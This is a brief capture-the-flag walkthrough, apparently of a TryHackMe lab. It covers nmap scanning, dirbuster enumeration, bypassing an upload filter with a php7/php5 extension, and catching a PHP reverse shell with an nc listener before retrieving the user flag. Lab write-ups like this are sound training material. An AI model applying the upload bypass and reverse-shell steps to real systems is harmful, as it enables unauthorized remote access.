1. Recon
   - `nmap -sC -sV -A -vv <target-ip>`
  
   - found two open ports: 22 & 80

2. Scan website directories with dirbuster
   - dirbuster -l /path/to/wordlist/file/wordlist.txt http://<target-ip>

Discovered info:
 - /panel/ path which lets you upload files(possible reverse shell code execution vector)
 - /uploads/ path which lets you see and execute uploaded files (reverse shell 100%)

3. Deliver the reverse shell
   - the website doesnt allow for .php uploads, so i changed it to php7 [ref: https://book.hacktricks.xyz/pentesting-web/file-upload]
   - used nc to listen on port 1234 so that when i execute the shell, i'll gain access to the target machine
     - `nc -lvnp 1234`
   - make sure to change file permissions to 755 so that it can be executed
   - change the script's ip to your machine's ip and port to whatever you want to listen 
   - to execute the reverse shell, just access the file via browser (ex: http://10.10.109.71/uploads/php-reverse-shell.php5)


4. Inside the target machine
   - since we already user.txt is the file we are looking for, we will try to find it in the whole system with the `find` command:
     - `find / -type f -name user.txt 2> /dev/null`
     - /var/www/user.txt < is the path to the file we are looking for, and inside it is the flag
     - THM{y0u_g0t_a_sh3ll}
